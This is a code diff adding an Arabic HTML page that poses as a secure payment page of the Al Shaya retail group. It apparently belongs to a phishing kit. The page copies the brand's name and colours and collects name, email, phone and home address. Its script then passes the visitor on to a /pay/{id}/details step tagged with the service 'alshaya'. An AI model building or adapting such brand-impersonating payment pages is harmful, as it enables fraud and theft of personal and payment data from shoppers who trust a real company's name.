@@ -1,0 +1,94 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>مجموعة الشايع - Al Shaya | صفحة دفع آمنة</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
+    <meta property="og:image" content="/og-alshaya.jpg" />
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Cairo', sans-serif; background: #FFF5F6; min-height: 100vh; direction: rtl; }
+        .hero { background: linear-gradient(135deg, #D71920 0%, #000000 100%); height: 200px; position: relative; }
+        .logo-badge { position: absolute; top: 20px; right: 20px; background: white; padding: 15px 20px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2); display: flex; align-items: center; gap: 10px; }
+        .logo-icon { width: 50px; height: 50px; background: linear-gradient(135deg, #D71920, #000000); border-radius: 8px; display: flex; align-items: center; justify-content: center; color: white; font-size: 24px; font-weight: 900; }
+        .logo-text h1 { font-size: 18px; color: #D71920; font-weight: 800; margin-bottom: 2px; }
+        .logo-text p { font-size: 12px; color: #000000; font-weight: 600; }
+        .container { max-width: 600px; margin: -60px auto 40px; padding: 0 20px; position: relative; z-index: 10; }
+        .card { background: white; border-radius: 16px; padding: 30px; box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15); border-top: 4px solid #D71920; }
+        .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; padding-bottom: 20px; border-bottom: 2px solid #FFF5F6; }
+        .card-header h2 { font-size: 24px; color: #1A1A1A; font-weight: 800; }
+        .icon-badge { width: 60px; height: 60px; background: linear-gradient(135deg, #D71920, #000000); border-radius: 12px; display: flex; align-items: center; justify-content: center; color: white; font-size: 28px; }
+        .form-group { margin-bottom: 20px; }
+        .form-label { display: flex; align-items: center; gap: 8px; font-size: 14px; font-weight: 700; color: #1A1A1A; margin-bottom: 8px; }
+        .form-label-icon { width: 20px; height: 20px; background: #FFF5F6; border-radius: 6px; display: flex; align-items: center; justify-content: center; color: #D71920; font-size: 12px; }
+        .form-input { width: 100%; padding: 14px 16px; border: 2px solid #E5E5E5; border-radius: 10px; font-size: 15px; font-family: 'Cairo', sans-serif; transition: all 0.3s; }
+        .form-input:focus { outline: none; border-color: #D71920; box-shadow: 0 0 0 4px rgba(0, 0, 0, 0.1); }
+        .btn-submit { width: 100%; padding: 16px; background: linear-gradient(135deg, #D71920 0%, #000000 100%); color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: 800; font-family: 'Cairo', sans-serif; cursor: pointer; transition: all 0.3s; margin-top: 10px; }
+        .btn-submit:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3); }
+        .security-badge { display: flex; align-items: center; justify-content: center; gap: 8px; padding: 12px; background: #FFF5F6; border-radius: 8px; margin-top: 20px; font-size: 13px; color: #D71920; font-weight: 700; }
+        .footer-text { text-align: center; font-size: 12px; color: #666; margin-top: 15px; }
+        .pet-transport { background: #FFF7ED; border: 2px solid #FDBA74; border-radius: 10px; padding: 12px; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; }
+        .pet-transport span { font-size: 14px; color: #EA580C; font-weight: 600; }
+    </style>
+</head>
+<body>
+    <div class="hero">
+        <div class="logo-badge">
+            <div class="logo-icon">🏬</div>
+            <div class="logo-text"><h1>مجموعة الشايع</h1><p>Al Shaya</p></div>
+        </div>
+    </div>
+    <div class="container">
+        <div class="card">
+            <div class="card-header"><h2>معلومات المستلم</h2><div class="icon-badge">💳</div></div>
+            <div class="pet-transport"><span>🐾</span><span>خدمة نقل الحيوانات متاحة - سيتم حسابها بشكل منفصل</span></div>
+            <form id="recipientForm" onsubmit="handleSubmit(event)">
+                <div class="form-group">
+                    <label class="form-label"><span class="form-label-icon">👤</span>الاسم الكامل</label>
+                    <input type="text" class="form-input" name="fullName" placeholder="أدخل اسمك الكامل" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label"><span class="form-label-icon">📧</span>البريد الإلكتروني</label>
+                    <input type="email" class="form-input" name="email" placeholder="example@email.com" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label"><span class="form-label-icon">📱</span>رقم الهاتف</label>
+                    <input type="tel" class="form-input" name="phone" placeholder="+965 / +973" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label"><span class="form-label-icon">📍</span>العنوان السكني</label>
+                    <input type="text" class="form-input" name="address" placeholder="أدخل عنوانك السكني الكامل" required>
+                </div>
+                <button type="submit" class="btn-submit">التالي ←</button>
+                <div class="security-badge">🔒 دفع آمن ومحمي</div>
+                <p class="footer-text">بالمتابعة، أنت توافق على الشروط والأحكام</p>
+            </form>
+        </div>
+    </div>
+    <script>
+        function handleSubmit(event) {
+            event.preventDefault();
+            const service = 'alshaya';
+            const urlParams = new URLSearchParams(window.location.search);
+            let payId = urlParams.get('payId') || '';
+            if (!payId) {
+                const path = window.location.pathname;
+                const payMatch = path.match(/\/pay\/([^\/\.]+)/);
+                payId = payMatch ? payMatch[1] : '';
+            }
+            sessionStorage.setItem('recipientData', JSON.stringify({
+                name: event.target.fullName.value,
+                email: event.target.email.value,
+                phone: event.target.phone.value,
+                address: event.target.address.value
+            }));
+            if (payId) {
+                window.location.href = `/pay/${payId}/details?service=${service}`;
+            } else {
+                window.location.href = '/pay/';
+            }
+        }
+    </script>
+</body>
+</html>
